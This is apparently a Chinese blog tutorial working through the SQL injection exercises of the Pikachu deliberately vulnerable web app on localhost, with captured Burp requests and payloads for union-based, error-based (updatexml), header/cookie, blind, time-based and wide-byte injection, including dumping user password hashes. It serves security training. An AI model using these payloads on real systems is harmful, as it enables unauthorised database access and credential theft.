---
title: Pikachu漏洞练习平台之SQL注入
tags:
  - web安全知识
categories:
  - web安全知识
copyright: true
abbrlink: 4d756ecc
date: 2020-02-27 18:03:41
---
**0x00 Pikachu**  
Pikachu是一个带有漏洞的Web应用系统，在这里包含了常见的web安全漏洞。  
项目地址：https://github.com/zhuifengshaonianhanlu/pikachu

**0x01 数字型注入（post）**  
界面如下  
![在这里插入图片描述](https://img-blog.csdnimg.cn/20200227142819265.png)

使用burpsuite抓包

    
    
    POST /pikachu/vul/sqli/sqli_id.php HTTP/1.1
    Host: 127.0.0.1
    User-Agent: Mozilla/5.0 (Windows NT 10.0; Win64; x64; rv:73.0) Gecko/20100101 Firefox/73.0
    Accept: text/html,application/xhtml+xml,application/xml;q=0.9,image/webp,*/*;q=0.8
    Accept-Language: zh-CN,zh;q=0.8,zh-TW;q=0.7,zh-HK;q=0.5,en-US;q=0.3,en;q=0.2
    Accept-Encoding: gzip, deflate
    Content-Type: application/x-www-form-urlencoded
    Content-Length: 30
    Origin: http://127.0.0.1
    Connection: close
    Referer: http://127.0.0.1/pikachu/vul/sqli/sqli_id.php
    Cookie: PHPSESSID=jcqksnto9ssab9bh3kokjrhmg6
    Upgrade-Insecure-Requests: 1
    
    id=1&submit=%E6%9F%A5%E8%AF%A2
    

id=1后面加单引号，报错，存在SQL注入  
![在这里插入图片描述](https://img-blog.csdnimg.cn/20200227143421891.png)  
数字型的SQL语句为 select * from user where id =$id 因此不需要闭合。直接构造SQL语句

    
    
    id=1 or 1=1#
    

![在这里插入图片描述](https://img-blog.csdnimg.cn/20200227143808976.png)  
查当前数据库

    
    
    id=1 union select 1,database()#
    

![在这里插入图片描述](https://img-blog.csdnimg.cn/20200227143947477.png)  
查询当前数据库中的表

    
    
    id=1 union select 1,table_name from information_schema.tables where table_schema="pikachu"#
    

![在这里插入图片描述](https://img-blog.csdnimg.cn/2020022714420750.png)  
查询users中的字段

    
    
    id=1 union select 1,column_name from information_schema.columns where table_name="users"#
    

![在这里插入图片描述](https://img-blog.csdnimg.cn/20200227144353620.png)  
查询users中的数据

    
    
    id=1 union select username,password from users#
    

![在这里插入图片描述](https://img-blog.csdnimg.cn/20200227144831837.png)  
密码是MD5加密的字符串，通过MD5在线解吗平台可以查看密码  
![在这里插入图片描述](https://img-blog.csdnimg.cn/20200227145019672.png)

**0x02字符型注入**  
界面如下  
![在这里插入图片描述](https://img-blog.csdnimg.cn/2020022714572097.png)  
在输入框中输入1加上单引号,数据库报错  
![在这里插入图片描述](https://img-blog.csdnimg.cn/20200227150138303.png)

猜测sql语句为select * from users where id = ‘$id’;需要闭合单引号

构造SQL语句 1’ or 1=1#  
![在这里插入图片描述](https://img-blog.csdnimg.cn/20200227150025767.png)  
判断查询语句的列数

    
    
    1'order by 1,2,3#
    

![在这里插入图片描述](https://img-blog.csdnimg.cn/20200227150410964.png)  
判断显示位

    
    
    1' union select 1,2#
    

![在这里插入图片描述](https://img-blog.csdnimg.cn/20200227150502496.png)  
查询当前数据库

    
    
    1' union select 1,database()#
    

![在这里插入图片描述](https://img-blog.csdnimg.cn/20200227150629369.png)  
其他同上，不在重复

**0x03 搜索型SQL注入**  
界面如下  
![在这里插入图片描述](https://img-blog.csdnimg.cn/20200227150740685.png)

输入1加单引号，发现数据报错  
![在这里插入图片描述](https://img-blog.csdnimg.cn/20200227150938109.png)  
猜测SQL查询语句为 select * from users where id like ‘%$id’;  
需要闭合单引号

构造SQL语句 1’ or 1=1#  
![在这里插入图片描述](https://img-blog.csdnimg.cn/20200227151250434.png)  
查看显示位

    
    
    1' union select 1,2,3#
    

![在这里插入图片描述](https://img-blog.csdnimg.cn/20200227151348794.png)  
查询当前数据库

    
    
    1' union select null,null,database()#
    

![在这里插入图片描述](https://img-blog.csdnimg.cn/20200227151457152.png)

**0x04 xx型注入**  
界面如下  
![在这里插入图片描述](https://img-blog.csdnimg.cn/20200227151559878.png)

输入1加单引号，数据库报错  
![在这里插入图片描述](https://img-blog.csdnimg.cn/20200227151650741.png)  
猜测SQL查询语句为 select * from users where id = (’$id’)  
需要闭合’)

构造SQL语句

    
    
    1') union select 1,2#
    

显示位如下  
![在这里插入图片描述](https://img-blog.csdnimg.cn/20200227151924420.png)

查询当前数据库

    
    
    1') union select null,database()#
    

![在这里插入图片描述](https://img-blog.csdnimg.cn/20200227152033167.png)

**0x05 insert/update注入**  
界面如下  
![在这里插入图片描述](https://img-blog.csdnimg.cn/202002271521540.png)  
点击注册，使用burpsuite抓包

    
    
    POST /pikachu/vul/sqli/sqli_iu/sqli_reg.php HTTP/1.1
    Host: 127.0.0.1
    User-Agent: Mozilla/5.0 (Windows NT 10.0; Win64; x64; rv:73.0) Gecko/20100101 Firefox/73.0
    Accept: text/html,application/xhtml+xml,application/xml;q=0.9,image/webp,*/*;q=0.8
    Accept-Language: zh-CN,zh;q=0.8,zh-TW;q=0.7,zh-HK;q=0.5,en-US;q=0.3,en;q=0.2
    Accept-Encoding: gzip, deflate
    Content-Type: application/x-www-form-urlencoded
    Content-Length: 64
    Origin: http://127.0.0.1
    Connection: close
    Referer: http://127.0.0.1/pikachu/vul/sqli/sqli_iu/sqli_reg.php
    Cookie: PHPSESSID=jcqksnto9ssab9bh3kokjrhmg6
    Upgrade-Insecure-Requests: 1
    
    username=1&password=123&sex=&phonenum=&email=&add=&submit=submit
    

在username=1后面加单引号，数据库报错  
![在这里插入图片描述](https://img-blog.csdnimg.cn/20200227152448665.png)  
猜测SQL的语句为insert into user(Username,Password,Sex,PhoneNum,Address1,Address2)
value(‘xxx’,xxx,‘男/女’,187xxxx,‘北京市xxx’,‘北京市xxx’)

在’xxx’处构造SQL语句闭合’or

查询前数据库

    
    
    username=1' or updatexml(1,concat(0x7e,(select database())),0x7e) or '
    

![在这里插入图片描述](https://img-blog.csdnimg.cn/20200227153752431.png)

查看pikachu的表

    
    
    or (select updatexml(1,concat(0x7e,(select group_concat(table_name)from information_schema.tables where table_schema=database())),0x7e)) or '
    

![在这里插入图片描述](https://img-blog.csdnimg.cn/20200227154033892.png)  
也可以一个表一个表的查看，使用limit  
查第一个表

    
    
    ' or updatexml(1,concat(0x7e,(select table_name from information_schema.tables where table_schema = 'pikachu' limit 0,1)),0) or' 
    

![在这里插入图片描述](https://img-blog.csdnimg.cn/20200227154311865.png)  
**0x06 delete注入**  
界面如下  
![在这里插入图片描述](https://img-blog.csdnimg.cn/20200227155153742.png)  
先进行留言，然后通过burpsuite进行抓包

    
    
    GET /pikachu/vul/sqli/sqli_del.php?id=65 HTTP/1.1
    Host: 127.0.0.1
    User-Agent: Mozilla/5.0 (Windows NT 10.0; Win64; x64; rv:73.0) Gecko/20100101 Firefox/73.0
    Accept: text/html,application/xhtml+xml,application/xml;q=0.9,image/webp,*/*;q=0.8
    Accept-Language: zh-CN,zh;q=0.8,zh-TW;q=0.7,zh-HK;q=0.5,en-US;q=0.3,en;q=0.2
    Accept-Encoding: gzip, deflate
    Connection: close
    Referer: http://127.0.0.1/pikachu/vul/sqli/sqli_del.php
    Cookie: PHPSESSID=jcqksnto9ssab9bh3kokjrhmg6
    Upgrade-Insecure-Requests: 1
    

在id=65后面加单引号，数据库报错  
![在这里插入图片描述](https://img-blog.csdnimg.cn/20200227155557863.png)  
猜测此时的SQL查询语句为 delete ‘xx’ from message where id=$id  
构造SQL语句

    
    
    or updatexml(1, concat(0x7e,database()), 0) 
    

![在这里插入图片描述](https://img-blog.csdnimg.cn/20200227163539501.png)

**0x07 http header注入**  
界面如下  
![在这里插入图片描述](https://img-blog.csdnimg.cn/20200227163734301.png)

输入admin,123456登录抓包

    
    
    POST /pikachu/vul/sqli/sqli_header/sqli_header_login.php HTTP/1.1
    Host: 127.0.0.1
    User-Agent: Mozilla/5.0 (Windows NT 10.0; Win64; x64; rv:73.0) Gecko/20100101 Firefox/73.0
    Accept: text/html,application/xhtml+xml,application/xml;q=0.9,image/webp,*/*;q=0.8
    Accept-Language: zh-CN,zh;q=0.8,zh-TW;q=0.7,zh-HK;q=0.5,en-US;q=0.3,en;q=0.2
    Accept-Encoding: gzip, deflate
    Content-Type: application/x-www-form-urlencoded
    Content-Length: 34
    Origin: http://127.0.0.1
    Connection: close
    Referer: http://127.0.0.1/pikachu/vul/sqli/sqli_header/sqli_header_login.php
    Cookie: ant[uname]=admin; ant[pw]=10470c3b4b1fed12c3baac014be15fac67c6e815; PHPSESSID=dem47ia5mg3vmof5hg167n1s54
    Upgrade-Insecure-Requests: 1
    
    username=1&password=1&submit=Login
    
    

点击Forward  
![在这里插入图片描述](https://img-blog.csdnimg.cn/20200227170801232.png)  
点击Forward后返回来的包

    
    
    GET /pikachu/vul/sqli/sqli_header/sqli_header.php HTTP/1.1
    Host: 127.0.0.1
    User-Agent: Mozilla/5.0 (Windows NT 10.0; Win64; x64; rv:73.0) Gecko/20100101 Firefox/73.0
    Accept: text/html,application/xhtml+xml,application/xml;q=0.9,image/webp,*/*;q=0.8
    Accept-Language: zh-CN,zh;q=0.8,zh-TW;q=0.7,zh-HK;q=0.5,en-US;q=0.3,en;q=0.2
    Accept-Encoding: gzip, deflate
    Referer: http://127.0.0.1/pikachu/vul/sqli/sqli_header/sqli_header_login.php
    Connection: close
    Cookie: ant[uname]=admin; ant[pw]=10470c3b4b1fed12c3baac014be15fac67c6e815; PHPSESSID=dem47ia5mg3vmof5hg167n1s54
    Upgrade-Insecure-Requests: 1
    
    
    

在UA后面加单引号,数据库报错  
![在这里插入图片描述](https://img-blog.csdnimg.cn/20200227170925704.png)  
构造SQL语句

    
    
    ' or updatexml(1,concat(0x7e,(select database())),0x7e) or '
    

![在这里插入图片描述](https://img-blog.csdnimg.cn/20200227171122617.png)

同样，在cookie处，admin后面加上单引号，数据库报错  
![在这里插入图片描述](https://img-blog.csdnimg.cn/20200227171322947.png)

构造SQL语句

    
    
    ant[uname]=admin' or updatexml(1,concat(0x7e,(select database())),0x7e) or ';
    

![在这里插入图片描述](https://img-blog.csdnimg.cn/20200227171435732.png)

**0x08 布尔盲注**  
界面  
![在这里插入图片描述](https://img-blog.csdnimg.cn/20200227171549751.png)

输入Kobe，正确返回  
![在这里插入图片描述](https://img-blog.csdnimg.cn/20200227171619316.png)  
构造语句

    
    
    kobe' order by 1,2,3#
    

输入kobe’ order by 1,2#  
则返回正确的信息，得一点一点的进行注入.直接用sqlmap就能一把跑出来.

**0x09 延时注入**  
界面  
![在这里插入图片描述](https://img-blog.csdnimg.cn/20200227172744285.png)  
构造语句

    
    
    1' or sleep(5)#
    

明显出现延时  
![在这里插入图片描述](https://img-blog.csdnimg.cn/20200227173055144.png)

**0x10 宽字节注入**  
界面  
![在这里插入图片描述](https://img-blog.csdnimg.cn/20200227173227454.png)  
打开burpsuit抓包

    
    
    POST /pikachu/vul/sqli/sqli_widebyte.php HTTP/1.1
    Host: 127.0.0.1
    User-Agent: Mozilla/5.0 (Windows NT 10.0; Win64; x64; rv:73.0) Gecko/20100101 Firefox/73.0
    Accept: text/html,application/xhtml+xml,application/xml;q=0.9,image/webp,*/*;q=0.8
    Accept-Language: zh-CN,zh;q=0.8,zh-TW;q=0.7,zh-HK;q=0.5,en-US;q=0.3,en;q=0.2
    Accept-Encoding: gzip, deflate
    Content-Type: application/x-www-form-urlencoded
    Content-Length: 32
    Origin: http://127.0.0.1
    Connection: close
    Referer: http://127.0.0.1/pikachu/vul/sqli/sqli_widebyte.php
    Cookie: PHPSESSID=fifnqas6vcnrr74lqseeeei4e2
    Upgrade-Insecure-Requests: 1
    
    name=1&submit=%E6%9F%A5%E8%AF%A2
    

构造SQL语句

    
    
    1%df' union select 1,database()#
    

![在这里插入图片描述](https://img-blog.csdnimg.cn/20200227180321515.png)

